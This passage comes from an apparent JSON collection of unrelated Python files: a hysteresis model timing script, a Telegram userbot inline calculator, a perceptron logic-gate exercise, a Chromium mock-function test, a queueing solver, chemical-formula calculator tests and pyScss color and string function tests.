= pd.read_csv(DataFile, delimiter = '\\t')\n    colV = '-2.00V_1'\n    \n    start = time.time()\n    y1,_ = HysteresisModel_Slow(data[colV],*list(initpar.values()))\n    time1 = time.time()-start\n    \n    start = time.time()\n    y2,_ = HysteresisModel_Fast(data[colV],*list(initpar.values()))\n    time2 = time.time()-start\n    \n    print('Slow: %.2f\\t\\tFast: %.2f\\t\\tSpeed Increase: %.0f%%'%(time1,time2,time1/time2*100))\n    \n    plt.figure()\n    plt.scatter(data[colV],np.abs(y1), color = 'black')\n    plt.plot(   data[colV], np.abs(y2), color = 'red')\n    plt.ylim(7.2e-10,2e-05)\n    plt.yscale('log')\n\n", "458": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "459": "# Jesse Corson\n# Spencer Tubbs\n# Connor Clayton\n# CS 4470\n\nimport random\n\n# wi = n(t-o)xi\n#  where n is the learning rate (eg 0.1)\n# t is the target output and o is the output generated by the perceptron\ndef ChangeInWeight(target, o, xi):\n    n = 0.1\n    return (n * (target - o) * xi)\n\n\ndef calcPerceptron(weightArray, x1, x2):\n    tempVal = weightArray[0] + (weightArray[1] * x1) + (weightArray[2] * x2)\n    if tempVal > 0:\n        return 1\n    else:\n        return -1\n    \ndef CalcWeights(targetArray, startingWeights):\n    currentArray = [0,0,0,0]\n    while targetArray != currentArray:\n        currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n        currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n        currentArray[2] = (calcPerceptron(startingWeights, 1, 0))\n        currentArray[3] = (calcPerceptron(startingWeights, 1, 1))\n        while(currentArray[0] != targetArray[0]):\n            tempVal = calcPerceptron(startingWeights, 0, 0)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[0], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[0], tempVal, 0)\n            startingWeights[2] = startingWeights[2] + ChangeInWeight(targetArray[0], tempVal, 0)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n            currentArray[2] = (calcPerceptron(startingWeights, 1, 0))\n            currentArray[3] = (calcPerceptron(startingWeights, 1, 1))\n        while(currentArray[1] != targetArray[1]):\n            tempVal = calcPerceptron(startingWeights, 0, 1)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[1], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[1], tempVal, 0)\n            startingWeights[2] = startingWeights[2] + ChangeInWeight(targetArray[1], tempVal, 1)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n            currentArray[2] = (calcPerceptron(startingWeights, 1, 0))\n            currentArray[3] = (calcPerceptron(startingWeights, 1, 1))\n        while(currentArray[2] != targetArray[2]):\n            tempVal = calcPerceptron(startingWeights, 1, 0)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[2], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[2], tempVal, 1)\n            startingWeights[2] = startingWeights[2] + ChangeInWeight(targetArray[2], tempVal, 0)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n            currentArray[2] = (calcPerceptron(startingWeights, 1, 0))\n            currentArray[3] = (calcPerceptron(startingWeights, 1, 1))\n        while(currentArray[3] != targetArray[3]):\n            tempVal = calcPerceptron(startingWeights, 1, 1)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[3], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[3], tempVal, 1)\n            startingWeights[2] = startingWeights[2] + ChangeInWeight(targetArray[3], tempVal, 1)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n            currentArray[2] = (calcPerceptron(startingWeights, 1, 0))\n            currentArray[3] = (calcPerceptron(startingWeights, 1, 1))\n    return startingWeights\n\ndef CalcNotWeights(targetArray, startingWeights):\n    currentArray = [0,0,0,0]\n    while targetArray != currentArray:\n        currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n        currentArray[1] = (calcPerceptron(startingWeights, 0, 1))\n        while(currentArray[0] != targetArray[0]):\n            tempVal = calcPerceptron(startingWeights, 0, 0)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[0], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[0], tempVal, 0)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 1, 0))\n        while(currentArray[1] != targetArray[1]):\n            tempVal = calcPerceptron(startingWeights, 1, 0)\n            startingWeights[0] = startingWeights[0] + ChangeInWeight(targetArray[1], tempVal, 1)\n            startingWeights[1] = startingWeights[1] + ChangeInWeight(targetArray[1], tempVal, 1)\n            currentArray[0] = (calcPerceptron(startingWeights, 0, 0))\n            currentArray[1] = (calcPerceptron(startingWeights, 1, 0))\n    return startingWeights\n\ndef CalcXorValues(andWeights, orWeights):\n    currentValues = []\n    \n    andValue = calcPerceptron(andWeights, 0, 0)\n    if andValue == -1:\n        andValue = 0\n    orValue = calcPerceptron(orWeights, 0, 0)\n    xorValue = orValue - (andValue * 2)\n    currentValues.append(xorValue)\n    \n    andValue = calcPerceptron(andWeights, 0, 1)\n    if andValue == -1:\n        andValue = 0\n    orValue = calcPerceptron(orWeights, 0, 1)\n    xorValue = orValue - (andValue * 2)\n    currentValues.append(xorValue)\n\n    andValue = calcPerceptron(andWeights, 1, 0)\n    if andValue == -1:\n        andValue = 0\n    orValue = calcPerceptron(orWeights, 1, 0)\n    xorValue = orValue - (andValue * 2)\n    currentValues.append(xorValue)\n\n    andValue = calcPerceptron(andWeights, 1, 1)\n    if andValue == -1:\n        andValue = 0\n    orValue = calcPerceptron(orWeights, 1, 1)\n    xorValue = orValue - (andValue * 2)\n    currentValues.append(xorValue)\n\n    returnValues = []\n    for x in currentValues:\n        if x > 0:\n            returnValues.append(1)\n        else:\n            returnValues.append(-1)\n        \n    return returnValues\n\n#Program starts here\nrandomWeights = []\nrandomWeights.append(random.uniform(-1,1))\nrandomWeights.append(random.uniform(-1,1))\nrandomWeights.append(random.uniform(-1,1))\n\nprint(\"Random starting weight values for AND and OR:\")\nfor x in randomWeights:\n    print(\"%.2f\" % x)\nprint()\n\n# AND\ntargetValues = [-1,-1,-1,1]\nandWeights = CalcWeights(targetValues, randomWeights).copy()\nprint(\"Final weight values for AND:\")\nfor x in andWeights:\n    print(\"%.2f\" % x)\nprint(\"\")\nprint(\"Output values for AND:\")\nprint(\"(0,0) = %i\" % calcPerceptron(andWeights, 0, 0))\nprint(\"(0,1) = %i\" % calcPerceptron(andWeights, 0, 1))\nprint(\"(1,0) = %i\" % calcPerceptron(andWeights, 1, 0))\nprint(\"(1,1) = %i\" % calcPerceptron(andWeights, 1, 1))\nprint(\"\")\n\n# OR\ntargetValues = [-1,1,1,1]\norWeights = CalcWeights(targetValues, randomWeights).copy()\nprint(\"Final weight values for OR:\")\nfor x in orWeights:\n    print(\"%.2f\" % x)\nprint(\"\")\nprint(\"Output values for OR:\")\nprint(\"(0,0) = %i\" % calcPerceptron(orWeights, 0, 0))\nprint(\"(0,1) = %i\" % calcPerceptron(orWeights, 0, 1))\nprint(\"(1,0) = %i\" % calcPerceptron(orWeights, 1, 0))\nprint(\"(1,1) = %i\" % calcPerceptron(orWeights, 1, 1))\nprint(\"\")\n\n#NOT\nrandomWeights = []\nrandomWeights.append(random.uniform(-1,1))\nrandomWeights.append(random.uniform(-1,1))\nprint(\"Random starting weight values for NOT:\")\nfor x in randomWeights:\n    print(\"%.2f\" % x)\nprint()\nrandomWeights.append(0)\ntargetValues = [1,-1, 0, 0]\nnotWeights = CalcNotWeights(targetValues, randomWeights)\nprint(\"Final weight values for NOT:\")\nnotWeights.pop()\nfor x in notWeights:\n    print(\"%.2f\" % x)\nprint(\"\")\nprint(\"Output values for NOT:\")\nrandomWeights.append(0)\nprint(\"(0,1) = %i\" % calcPerceptron(notWeights, 0, 1))\nprint(\"(1,0) = %i\" % calcPerceptron(notWeights, 1, 0))\nnotWeights.pop()\nprint(\"\")\n\n#XOR\nxorValues = CalcXorValues(andWeights, orWeights)\nprint(\"Output values for XOR: Using OR - (AND * 2)\")\nprint(\"(0,0) = %i\" % xorValues[0])\nprint(\"(0,1) = %i\" % xorValues[1])\nprint(\"(1,0) = %i\" % xorValues[2])\nprint(\"(1,1) = %i\" % xorValues[3])\nprint(\"\")\n", "460": "#!/usr/bin/env python\n# Copyright 2013 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nimport unittest\n\nfrom mock_function import MockFunction\n\n\nclass MockFunctionUnittest(unittest.TestCase):\n  def testMockFunction(self):\n    @MockFunction\n    def calc(a, b, mult=1):\n      return (a + b) * mult\n\n    self.assertTrue(*calc.CheckAndReset(0))\n    self.assertEqual(\n        (False, 'calc: expected 1 call(s), got 0'), calc.CheckAndReset(1))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertTrue(*calc.CheckAndReset(1))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(20, calc(2, 3, mult=4))\n    self.assertEqual(\n        (False, 'calc: expected 0 call(s), got 1'), calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertTrue(*calc.CheckAndReset(2))\n    self.assertTrue(*calc.CheckAndReset(0))\n\n    self.assertEqual(3, calc(1, 2))\n    self.assertEqual(0, calc(3, 4, mult=0))\n    self.assertEqual(\n        (False, 'calc: expected 3 call(s), got 2'), calc.CheckAndReset(3))\n\n\nif __name__ == '__main__':\n  unittest.main()\n", "461": "import math\n\n\nclass Derivative:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x):\n        f, h = self.f, self.h\n        return (f(x+h) - f(x-h))/(2*h)\n\nclass Derivative2:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x):\n        f, h = self.f, self.h\n        return (f(x+h) - 2 * f(x) + f(x-h))/h**2\n\n\ndef C(n, k):\n    return math.factorial(n)/(math.factorial(n-k)*math.factorial(k))\n\ndef b(value):\n    res = [0]\n    summ = 0\n    for i in range(1, value):\n        summ += i\n    for i in range(1, value):\n        res.append(i/summ)\n    return res\n\n\nclass Solver:\n\n    def __init__(self, a, infin=3, fun = b):\n        assert 0 < a < 1\n        self.a = a\n        self.inf = infin\n        self.b = fun(self.inf)\n        self.inA = 1 - a\n        self.inB = self.calc_inB()\n        self.q = []\n        self.p = {}\n        self.ro = self.a*self.inB\n\n    def reload(self, a, infin=3):\n        assert 0 < a < 1\n        self.a = a\n        self.inf = infin\n        self.b = b(self.inf)\n        self.inA = 1 - a\n        self.inB = self.calc_inB()\n        self.ro = self.a*self.inB\n\n    def calc_inB(self):\n        summ = 0\n        for i in range(self.inf):\n            summ += i*self.b[i]\n        return summ\n\n    def calc_Bi(self, i):\n        summ = 0\n        for j in range(i, self.inf):\n            summ += self.b[j]\n        return summ\n\n    def calc_pmn(self, m, n):\n        if self.p.get((m,n)):\n            return self.p.get((m,n))\n        if m==0:\n            if n==0:\n                self.p[(m, n)] = 1 - self.a*self.calc_Bi(1)\n                return self.p[(m, n)]\n            elif n==1:\n                self.p[(m, n)] = self.a*self.calc_Bi(1)\n                return self.p[(m, n)]\n            else:\n                self.p[(m, n)] = 0\n                return self.p[(m, n)]\n        elif n==0:\n            self.p[(m, n)] = ((1-self.a*self.calc_Bi(m+1))*self.calc_pmn(m-1, 0))\n            return self.p[(m, n)]\n        else:\n            self.p[(m, n)] = ((1-self.a*self.calc_Bi(m+1))*self.calc_pmn(m-1,n) + self.a*self.calc_Bi(m+1) *\\\n                    self.calc_pmn(m-1, n-1))\n            return self.p[(m, n)]\n\n    def calc_Pz(self, z):\n        mult = 1\n        for n in range(self.inf):\n            mult *= (1-self.a*(1-z)*self.calc_Bi(n+1))\n        return mult\n\n    def calc_N1(self):\n        df = Derivative(self.calc_Pz)\n        return df(1)\n\n    def calc_N2(self):\n        summ = 0\n        for n in range(self.inf):\n            summ += self.calc_Bi(n+1)\n        return self.a*summ\n\n    def calc_N3(self):\n        summ = 0\n        for n in range(1, self.inf):\n            summ += n*self.calc_pmn(10, n)\n        return summ\n\n    def calc_D(self):\n        df = Derivative(self.calc_Pz)\n        df2 = Derivative2(self.calc_Pz)\n        return df2(1)+df(1)-df(1)**2\n", "462": "from .. import ForceCalc, Formula\nfrom Orbitool.utils import formula\n\n\ndef test_forcecalc1():\n    calc = ForceCalc()\n    f = Formula('C3HO3-')\n    assert f in calc.get(f.mass(), base_group=Formula(\"-\"))\n\n    calc['H[2]'] = 100\n    calc['H'] = 0\n    calc['O[18]'] = 100\n    assert calc['H[2]'] == 100\n    assert calc['H'] == 0\n    assert calc['O[18]'] == 100\n    f = Formula('C10H[2]O[18]-')\n    assert f in calc.get(f.mass(), base_group=Formula(\"-\"))\n\n\ndef test_forcecalc2():\n    calc = ForceCalc()\n    calc['H[2]'] = 100\n    calc['O[18]'] = 100\n    # f = Formula('C10H[2]O[18]-')\n    f = Formula('C10H[2]O[18]-')\n    assert f in calc.get(f.mass(), base_group=Formula(\"-\"))\n\n\ndef test_forcecalc3():\n    calc = ForceCalc()\n    calc['C[13]'] = 3\n    calc['O[18]'] = 3\n    calc['N'] = 5\n    calc['H'] = 40\n    calc['C'] = 40\n    calc['O'] = 30\n\n    samples = ['C16H20O10O[18]2N3-', 'C10H17O10N3NO3-']\n\n    samples = [Formula(sample) for sample in samples]\n\n    for f in samples:\n        ret = calc.get(f.mass(), base_group=Formula(\"-\"))\n        assert f in ret\n        assert len(ret) < 25\n        for r in ret:\n            assert abs(r.mass() / f.mass() - 1) < calc.rtol\n\n\ndef test_forcecalc4():\n    calc = ForceCalc()\n    calc['C'] = 20\n    calc['H'] = 40\n    calc['C[13]'] = 3\n    calc['N'] = 5\n    calc['O'] = 999\n    calc['O[18]'] = 3\n    calc['H[2]'] = 10\n    ret = calc.get(242.158, Formula(\"-\"))\n    assert Formula('C10H6H[2]10O6-') in ret\n\n\ndef test_forcecalc5():\n    calc = ForceCalc()\n    calc['N'] = 999\n    f = Formula('CH4+')  # +\n    assert f in calc.get(f.mass(), base_group=Formula(\"+\"))\n\n\ndef test_basegroup():\n    calc = ForceCalc()\n    calc['N'] = 10\n    calc['O'] = 10\n    calc['H'] = 10\n    calc['N[15]'] = 10\n    calc['O[18]'] = 10\n    f = Formula(\"HNO3\")\n    assert f in calc.get(f.mass(), base_group=Formula(\"NO3\"))\n    f = Formula(\"HNO2O[18]\")\n    assert f in calc.get(f.mass(), base_group=Formula(\"NO3\"))\n    f = Formula(\"HNO3\")\n    assert f in calc.get(f.mass(), base_group=Formula(\"HNO3\"))\n\n\ndef test_basegroup_nonisotope():\n    calc = ForceCalc()\n    calc['N'] = 10\n    calc['O[18]'] = 0\n    calc['N[15]'] = 0\n    f = Formula(\"HNO3\")\n    assert f in calc.get(f.mass())\n\ndef test_minus():\n    calc = ForceCalc()\n    for ei in calc.getEIList():\n        calc[ei] = 0\n    calc[\"C\"] = 10\n    calc[\"H\"] = 10\n    f = Formula(\"CH5-\")\n    ret = calc.get(f.mass(), Formula(\"-\"))\n    assert f in ret", "463": "\"\"\"Tests for the core Sass functions, as defined in the original Sass\ndocumentation:\n\nhttp://sass-lang.com/docs/yardoc/Sass/Script/Functions.html\n\"\"\"\nfrom __future__ import division\n\nfrom scss.expression import Calculator\nfrom scss.functions.core import CORE_LIBRARY\nfrom scss.rule import Namespace\nfrom scss.types import Color, Number, String\n\nimport pytest\nxfail = pytest.mark.xfail\n\n\n# TODO many of these tests could also stand to test for failure cases\n\n@pytest.fixture\ndef calc():\n    ns = Namespace(functions=CORE_LIBRARY)\n    return Calculator(ns).evaluate_expression\n\n\n# ------------------------------------------------------------------------------\n# RGB functions\n\ndef test_rgb(calc):\n    assert calc('rgb(128, 192, 224)') == Color.from_rgb(128/255, 192/255, 224/255)\n    assert calc('rgb(20%, 40%, 60%)') == Color.from_rgb(0.2, 0.4, 0.6)\n\n\ndef test_rgba(calc):\n    # four args (css-style)\n    assert calc('rgba(128, 192, 224, 0.5)') == Color.from_rgb(128/255, 192/255, 224/255, 0.5)\n    assert calc('rgba(20%, 40%, 60%, 0.7)') == Color.from_rgb(0.2, 0.4, 0.6, 0.7)\n\n    # two args (modify alpha of existing color)\n    assert calc('rgba(red, 0.4)') == Color.from_rgb(1., 0., 0., 0.4)\n\n\ndef test_red(calc):\n    assert calc('red(orange)') == Number(255)\n\n\ndef test_green(calc):\n    assert calc('green(orange)') == Number(165)\n\n\ndef test_blue(calc):\n    assert calc('blue(orange)') == Number(0)\n\n\ndef test_mix(calc):\n    # Examples from the Ruby docs\n    # Note that the results have been adjusted slightly; Ruby floors the mixed\n    # channels, but we round\n    assert calc('mix(#f00, #00f)') == calc('#800080')\n    assert calc('mix(#f00, #00f, 25%)') == calc('#4000bf')\n    assert calc('mix(rgba(255, 0, 0, 0.5), #00f)') == calc('rgba(64, 0, 191, 0.75)')\n\n\n# ------------------------------------------------------------------------------\n# HSL functions\n\ndef test_hsl(calc):\n    # Examples from the CSS 3 color spec, which Sass uses\n    # (http://www.w3.org/TR/css3-color/#hsl-color)\n    assert calc('hsl(0, 100%, 50%)') == Color.from_rgb(1., 0., 0.)\n    assert calc('hsl(120, 100%, 50%)') == Color.from_rgb(0., 1., 0.)\n    assert calc('hsl(120, 100%, 25%)') == Color.from_rgb(0., 0.5, 0.)\n    assert calc('hsl(120, 100%, 75%)') == Color.from_rgb(0.5, 1., 0.5)\n    assert calc('hsl(120, 75%, 75%)') == Color.from_rgb(0.5625, 0.9375, 0.5625)\n\n\ndef test_hsla(calc):\n    # Examples from the CSS 3 color spec\n    assert calc('hsla(120, 100%, 50%, 1)') == Color.from_rgb(0., 1., 0.,)\n    assert calc('hsla(240, 100%, 50%, 0.5)') == Color.from_rgb(0., 0., 1., 0.5)\n    assert calc('hsla(30, 100%, 50%, 0.1)') == Color.from_rgb(1., 0.5, 0., 0.1)\n\n\ndef test_hue(calc):\n    assert calc('hue(yellow)') == Number(60, unit='deg')\n\n\ndef test_saturation(calc):\n    assert calc('saturation(yellow)') == Number(100, unit='%')\n\n\ndef test_lightness(calc):\n    assert calc('lightness(yellow)') == Number(50, unit='%')\n\n\n# HSL manipulation functions\n\ndef test_adjust_hue(calc):\n    # Examples from the Ruby docs\n    assert calc('adjust-hue(hsl(120, 30%, 90%), 60deg)') == calc('hsl(180, 30%, 90%)')\n    assert calc('adjust-hue(hsl(120, 30%, 90%), -60deg)') == calc('hsl(60, 30%, 90%)')\n    assert calc('adjust-hue(#811, 45deg)') == Color.from_rgb(136/255, 106.25/255, 17/255)\n\n\ndef test_lighten(calc):\n    # Examples from the Ruby docs\n    assert calc('lighten(hsl(0, 0%, 0%), 30%)') == calc('hsl(0, 0, 30)')\n    assert calc('lighten(#800, 20%)') == calc('#e00')\n\n\ndef test_darken(calc):\n    # Examples from the Ruby docs\n    assert calc('darken(hsl(25, 100%, 80%), 30%)') == calc('hsl(25, 100%, 50%)')\n    assert calc('darken(#800, 20%)') == calc('#200')\n\n\ndef test_saturate(calc):\n    # Examples from the Ruby docs\n    assert calc('saturate(hsl(120, 30%, 90%), 20%)') == calc('hsl(120, 50%, 90%)')\n    assert calc('saturate(#855, 20%)') == Color.from_rgb(158.1/255, 62.9/255, 62.9/255)\n\n\ndef test_desaturate(calc):\n    # Examples from the Ruby docs\n    assert calc('desaturate(hsl(120, 30%, 90%), 20%)') == calc('hsl(120, 10%, 90%)')\n    assert calc('desaturate(#855, 20%)') == Color.from_rgb(113.9/255, 107.1/255, 107.1/255)\n\n\ndef test_grayscale(calc):\n    assert calc('grayscale(black)') == Color.from_rgb(0., 0., 0.)\n    assert calc('grayscale(white)') == Color.from_rgb(1., 1., 1.)\n    assert calc('grayscale(yellow)') == Color.from_rgb(0.5, 0.5, 0.5)\n\n\ndef test_grayscale_css_filter(calc):\n    # grayscale(number) is a CSS filter and should be left alone\n    assert calc('grayscale(1)') == String(\"grayscale(1)\")\n\n\ndef test_complement(calc):\n    assert calc('complement(black)') == Color.from_rgb(0., 0., 0.)\n    assert calc('complement(white)') == Color.from_rgb(1., 1., 1.)\n    assert calc('complement(yellow)') == Color.from_rgb(0., 0., 1.)\n\n\ndef test_invert(calc):\n    assert calc('invert(black)') == Color.from_rgb(1., 1., 1.)\n    assert calc('invert(white)') == Color.from_rgb(0., 0., 0.)\n    assert calc('invert(yellow)') == Color.from_rgb(0., 0., 1.)\n\n\n# ------------------------------------------------------------------------------\n# Opacity functions\n\ndef test_alpha_opacity(calc):\n    assert calc('alpha(black)') == Number(1.)\n    assert calc('alpha(rgba(black, 0.5))') == Number(0.5)\n    assert calc('alpha(rgba(black, 0))') == Number(0.)\n\n    # opacity is a synonym\n    assert calc('opacity(black)') == Number(1.)\n    assert calc('opacity(rgba(black, 0.5))') == Number(0.5)\n    assert calc('opacity(rgba(black, 0))') == Number(0.)\n\n\n@xfail(reason=\"currently a parse error -- so it still works in practice, but...\")\ndef test_alpha_ie_filter(calc):\n    # alpha() is supposed to leave the IE filter syntax alone\n    assert calc('alpha(filter=20)') == \"alpha(filter=20)\"\n\n\ndef test_opacify_fadein(calc):\n    # Examples from the Ruby docs\n    assert calc('opacify(rgba(0, 0, 0, 0.5), 0.1)') == calc('rgba(0, 0, 0, 0.6)')\n    assert calc('opacify(rgba(0, 0, 17, 0.8), 0.2)') == calc('#001')\n\n    # fade-in is a synonym\n    assert calc('fade-in(rgba(0, 0, 0, 0.5), 0.1)') == calc('rgba(0, 0, 0, 0.6)')\n    assert calc('fade-in(rgba(0, 0, 17, 0.8), 0.2)') == calc('#001')\n\n\ndef test_transparentize_fadeout(calc):\n    # Examples from the Ruby docs\n    assert calc('transparentize(rgba(0, 0, 0, 0.5), 0.1)') == calc('rgba(0, 0, 0, 0.4)')\n    assert calc('transparentize(rgba(0, 0, 0, 0.8), 0.2)') == calc('rgba(0, 0, 0, 0.6)')\n\n    # fade-out is a synonym\n    assert calc('fade-out(rgba(0, 0, 0, 0.5), 0.1)') == calc('rgba(0, 0, 0, 0.4)')\n    assert calc('fade-out(rgba(0, 0, 0, 0.8), 0.2)') == calc('rgba(0, 0, 0, 0.6)')\n\n\n# ------------------------------------------------------------------------------\n# Other color functions\n\ndef test_adjust_color(calc):\n    # Examples from the Ruby docs\n    assert calc('adjust-color(#102030, $blue: 5)') == calc('#102035')\n    assert calc('adjust-color(#102030, $red: -5, $blue: 5)') == calc('#0b2035')\n    assert calc('adjust-color(hsl(25, 100%, 80%), $lightness: -30%, $alpha: -0.4)') == calc('hsla(25, 100%, 50%, 0.6)')\n\n\ndef test_scale_color(calc):\n    # Examples from the Ruby docs\n    assert calc('scale-color(hsl(120, 70, 80), $lightness: 50%)') == calc('hsl(120, 70, 90)')\n    assert calc('scale-color(rgb(200, 150, 170), $green: -40%, $blue: 70%)') == calc('rgb(200, 90, 229)')\n    assert calc('scale-color(hsl(200, 70, 80), $saturation: -90%, $alpha: -30%)') == calc('hsla(200, 7, 80, 0.7)')\n\n\ndef test_change_color(calc):\n    # Examples from the Ruby docs\n    assert calc('change-color(#102030, $blue: 5)') == calc('#102005')\n    assert calc('change-color(#102030, $red: 120, $blue: 5)') == calc('#782005')\n    assert calc('change-color(hsl(25, 100%, 80%), $lightness: 40%, $alpha: 0.8)') == calc('hsla(25, 100%, 40%, 0.8)')\n\n    assert calc('change-color(red, $hue: 240)') == calc('blue')\n\n\ndef test_ie_hex_str(calc):\n    # Examples from the Ruby docs\n    assert calc('ie-hex-str(#abc)') == calc('\"#FFAABBCC\"')\n    assert calc('ie-hex-str(#3322BB)') == calc('\"#FF3322BB\"')\n    assert calc('ie-hex-str(rgba(0, 255, 0, 0.5))') == calc('\"#8000FF00\"')\n\n\n# ------------------------------------------------------------------------------\n# String functions\n\ndef test_unquote(calc):\n    # Examples from the Ruby docs\n    ret = calc('unquote(\"foo\")')\n    assert ret == String('foo')\n    assert ret.quotes is None\n    ret = calc('unquote(foo)')\n    assert ret == String('foo')\n    assert ret.quotes is None\n\n    assert calc('unquote((one, two, three))') == String('one, two, three')\n\n\ndef test_quote(calc):\n    # Examples from the Ruby docs\n    ret = calc('quote(\"foo\")')\n    assert ret == String('foo')\n    assert ret.quotes == '\"'\n    ret = calc('quote(foo)')\n    assert ret == String('foo')\n    assert ret.quotes == '\"'\n\n\n# TODO more of these need quote checking too\ndef test_str_length(calc):\n    # Examples from the Ruby docs\n    assert calc('str-length(\"foo\")') == calc('3')\n\n\ndef test_str_insert(calc):\n    # Examples from the Ruby docs\n    assert calc('str-insert(\"abcd\", \"X\", 1)') == calc('\"Xabcd\"')\n    assert calc('str-insert(\"abcd\", \"X\", 4)') == calc('\"abcXd\"')\n    # DEVIATION: see https://github.com/nex3/sass/issues/954\n    assert calc('str-insert(\"abcd\", \"X\", 5)') == calc('\"abcdX\"')\n\n\ndef test_str_index(calc):\n    # Examples from the Ruby docs\n    assert calc('str-index(abcd, a)') == calc('1')\n    assert calc('str-index(abcd, ab)') == calc('1')\n    assert calc('str-index(abcd, X)') == calc('0')\n    assert calc('str-index(abcd, c)') == calc('3')\n\n\ndef test_str_slice(calc):\n    # Examples from the Ruby docs\n    assert calc('str-slice(\"abcd\", 2, 3)') == calc('\"bc\"')\n    assert calc('str-slice(\"abcd\", 2)') == calc('\"bcd\"')\n    assert calc('str-slice(\"abcd\", -3, -2)') == calc('\"bc\"')\n    assert calc('str-slice(\"abcd\", 2, -2)') == 